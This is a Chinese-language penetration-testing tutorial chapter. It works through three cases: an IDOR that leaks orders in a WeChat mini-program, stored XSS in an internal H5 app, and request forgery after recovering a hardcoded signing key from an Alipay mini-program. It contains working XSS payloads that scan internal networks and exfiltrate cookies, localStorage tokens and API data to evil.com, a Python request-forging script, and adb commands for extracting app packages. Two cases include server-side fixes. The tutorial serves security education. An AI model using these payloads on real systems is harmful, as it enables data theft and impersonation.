# 实战案例

### 9.1 案例一：微信小程序接口越权

**背景**：某电商小程序存在订单信息泄露漏洞，攻击者可查看任意用户的订单。

**分析过程**：

```bash
# 步骤1：获取小程序包
adb shell "su -c 'ls /data/data/com.tencent.mm/MicroMsg/*/appbrand/pkg/'"
# 输出：_-1234567890abcdef_1.0.0.wxapkg
adb shell "su -c 'cp /data/data/com.tencent.mm/MicroMsg/*/appbrand/pkg/_-1234567890abcdef_1.0.0.wxapkg /sdcard/'"
adb pull /sdcard/_-1234567890abcdef_1.0.0.wxapkg ./

# 步骤2：反编译
node wuWxapkg.js _-1234567890abcdef_1.0.0.wxapkg

# 步骤3：提取 API 接口
grep -rnE "url:.*order" ./output/
# 发现：
# pages/order/detail.js:    url: 'https://api.targetmall.com/v1/order/getDetail'

# 步骤4：分析接口调用逻辑
cat ./output/pages/order/detail.js | head -30
# 关键代码：
"""
wx.request({
    url: 'https://api.targetmall.com/v1/order/getDetail',
    data: {
        orderId: orderId,
        userId: app.globalData.userId
    },
    success(res) {
        // 渲染订单详情
    }
})
"""

# 步骤5：抓包验证
# 配置 Burp Suite 代理，在小程序中打开订单详情页
# 捕获请求：
# GET /v1/order/getDetail?orderId=ORD20240115001&userId=U10001 HTTP/1.1
# Authorization: Bearer eyJhbGciOiJIUzI1NiIs...

# 步骤6：越权测试
# 修改 userId 为其他用户
# GET /v1/order/getDetail?orderId=ORD20240115001&userId=U10002 HTTP/1.1
# 服务端返回了 U10002 用户的订单数据！

# 进一步测试：遍历 orderId
# 使用 Burp Intruder
# Payload: ORD${num:20240115001:20240115100}
# 发现大量订单数据可通过遍历获取

# 漏洞危害：
# 1. 任意用户订单信息泄露（收货人姓名、地址、手机号）
# 2. 订单金额泄露
# 3. 可能导致退款欺诈
```

**修复方案**：

```java
// 服务端修复
@GetMapping("/v1/order/getDetail")
public ResponseEntity<?> getOrderDetail(
        @RequestParam String orderId,
        @RequestParam(required = false) String userId,
        @RequestHeader("Authorization") String token) {

    // 1. 从 Token 中提取当前登录用户
    String currentUserId = JwtUtils.getUserId(token);

    // 2. 从数据库查询订单，校验归属
    Order order = orderService.getById(orderId);
    if (!order.getUserId().equals(currentUserId)) {
        return ResponseEntity.status(403).body(Map.of("error", "无权访问此订单"));
    }

    // 3. 不信任客户端传入的 userId 参数
    return ResponseEntity.ok(order);
}
```

### 9.2 案例二：H5 XSS 到内网信息泄露

**背景**：某企业内部管理 H5 应用存在存储型 XSS，攻击者借此实现内网信息探测。

```html
<!-- 步骤1：发现 XSS -->
<!-- 某内部管理系统 H5 页面的评论功能 -->
<!-- 评论内容直接存储并展示，无过滤 -->

<!-- 攻击者提交的评论 -->
<script>
// XSS Payload：探测内网
var targets = [
    'http://192.168.1.1',           // 路由器
    'http://192.168.1.100:8080',   // 内网服务器
    'http://192.168.1.200:3306',   // 数据库
    'http://10.0.0.1',             // 内网网关
    'http://10.0.0.50:9090'        // 监控系统
];

targets.forEach(function(target) {
    // 使用 Image 探测内网端口
    var img = new Image();
    img.onload = function() {
        // 端口开放，上报到攻击者服务器
        new Image().src = 'https://evil.com/log?type=alive&target=' + target;
    };
    img.onerror = function() {
        // 端口关闭
        new Image().src = 'https://evil.com/log?type=closed&target=' + target;
    };
    img.src = target + '/favicon.ico';

    // 使用 fetch 探测 HTTP 服务
    fetch(target, {mode: 'no-cors'})
        .then(function() {
            new Image().src = 'https://evil.com/log?type=http&target=' + target;
        })
        .catch(function(){});
});
</script>

<!-- 步骤2：获取当前用户的 Cookie -->
<script>
// 读取 localStorage 和 Cookie
var stolen = 'cookies=' + document.cookie + '&';
for (var i = 0; i < localStorage.length; i++) {
    var key = localStorage.key(i);
    stolen += key + '=' + localStorage.getItem(key) + '&';
}
// 上报
new Image().src = 'https://evil.com/steal?' + stolen;
</script>

<!-- 步骤3：利用 Token 访问内网 API -->
<script>
// 使用受害者的 Token 访问内网 API
var token = localStorage.getItem('auth_token');
fetch('https://internal.target.com/api/v1/users', {
    headers: { 'Authorization': 'Bearer ' + token }
})
.then(r => r.json())
.then(data => {
    // 将用户列表上报
    new Image().src = 'https://evil.com/exfil?data=' + btoa(JSON.stringify(data));
});
</script>
```

### 9.3 案例三：支付宝小程序逆向

**背景**：某支付宝小程序使用了自研签名算法，需要分析其签名逻辑以进行接口安全测试。

```bash
# 步骤1：获取小程序包
adb shell "su -c 'ls /data/data/com.eg.android.AlipayGphone/files/mini_data/'"
# 输出：2024000012345/
adb shell "su -c 'ls /data/data/com.eg.android.AlipayGphone/files/mini_data/2024000012345/'"
# 输出：app.amr  config.json

adb shell "su -c 'cp /data/data/com.eg.android.AlipayGphone/files/mini_data/2024000012345/app.amr /sdcard/'"
adb pull /sdcard/app.amr ./

# 步骤2：反编译
unveilr --platform alipay app.amr -o ./output

# 步骤3：分析签名逻辑
grep -rn "sign\|signature\|encrypt" ./output/
# 发现：utils/crypto.js 中有签名算法

cat ./output/utils/crypto.js
"""
function generateSign(params, secret) {
    // 1. 参数排序
    var sortedKeys = Object.keys(params).sort();
    var signStr = '';
    for (var i = 0; i < sortedKeys.length; i++) {
        signStr += sortedKeys[i] + '=' + params[sortedKeys[i]] + '&';
    }
    // 2. 拼接密钥
    signStr += 'key=' + secret;
    // 3. MD5 签名
    return md5(signStr).toUpperCase();
}

// 密钥硬编码
var APP_SECRET = 'alipay_mini_secret_2024';
"""

# 步骤4：伪造请求
# 获取了签名算法和密钥后，可伪造任意合法请求
python3 -c "
import hashlib
import requests

params = {
    'userId': 'U10001',
    'timestamp': '1710500000',
    'nonce': 'abc123',
    'action': 'getBalance'
}

# 生成签名
sorted_keys = sorted(params.keys())
sign_str = '&'.join([f'{k}={params[k]}' for k in sorted_keys]) + '&key=alipay_mini_secret_2024'
sign = hashlib.md5(sign_str.encode()).hexdigest().upper()
params['sign'] = sign

# 发送伪造请求
resp = requests.post('https://api.target.com/v1/execute', json=params)
print(resp.json())
"

# 漏洞危害：
# 攻击者可伪造任意签名，以任意用户身份调用接口
# 签名密钥泄露导致整套鉴权机制失效
```

**修复方案**：

```javascript
// 前端：不存储密钥，改用服务端签名
// 1. 前端获取临时 Token
const token = await getServerToken(); // 服务端生成短期 Token

// 2. 使用 Token 调用接口
wx.request({
    url: 'https://api.target.com/v1/execute',
    header: { 'Authorization': 'Bearer ' + token },
    data: { action: 'getBalance' }
});

// 服务端：
// 1. 使用 RSA2 签名（私钥服务端保存）
// 2. 签名密钥不下发到前端
// 3. 使用短期 Token（15分钟过期）
// 4. 关键操作需二次验证（短信验证码等）
```
